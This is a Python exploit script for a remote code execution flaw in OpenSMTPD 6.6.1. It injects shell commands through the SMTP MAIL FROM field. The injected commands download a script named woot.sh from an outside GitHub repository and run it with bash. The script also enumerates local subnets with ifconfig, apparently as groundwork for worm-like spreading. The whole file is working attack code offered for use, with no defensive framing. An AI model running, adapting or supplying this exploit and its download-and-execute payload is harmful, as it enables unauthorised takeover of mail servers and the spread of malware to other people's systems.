# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Date: 2022
# Author: Eric
#!/usr/local/bin/python3

from socket import *
import sys
import base64
import time
import subprocess
import ipaddress

def paired(iterable):
	a = iter(iterable)
	return zip(a, a)

def find_subnets():
	ifconfig = subprocess.check_output(['ifconfig'], text = True)
	# rn i want this example cinet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
	strs = ifconfig.split("\n ")
	lst = []
	for item in strs:
		if 'netmask' in item:
			lst.append(item)
	lst = str(lst)
	lst = lst.split("  ")
	strs = [] # list of broadcasts?
	for item in lst: # seperate into broadcast and netmask duos
		if 'netmask' in item or 'inet' in item and not '127.0.0.1' in item: # block out home addr
			strs.append(item)
			
	targets = []
	for item in strs: #tryna get 1.2.3.4/255.255.0.0 etc
		i = "" 
		if 'inet ' in item:
			i += item[6:] # to get 1.2.3.4
			
		if 'netmask' in item:
			i += '/'
			i += item[8:]

	for x, y in paired(strs):
		i = "" 
		if 'inet ' in x:
			i += x[6:] # to get 1.2.3.4
			
		if 'netmask' in y:
			i += '/'
			i += y[8:]
		i = ipaddress.IPv4Interface(i)
		i = i.with_prefixlen
		targets.append(i)
		
	return targets
	
print(find_subnets())

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
print(ADDR + " " + str(PORT))
CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']

for cmdnum in range(len(CMD)):
    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ADDR, PORT))
    res = s.recv(1024)
    if 'OpenSMTPD' not in str(res):
        print('[!] No OpenSMTPD detected')
        print('[!] Received {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] OpenSMTPD detected')
    s.send(b'HELO x\r\n')
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error connecting, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Connected, sending payload' + CMD[cmdnum])
    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error sending payload, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Payload sent')
    s.send(b'RCPT TO:<root>\r\n')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    print('[*] Done')
    time.sleep(3)



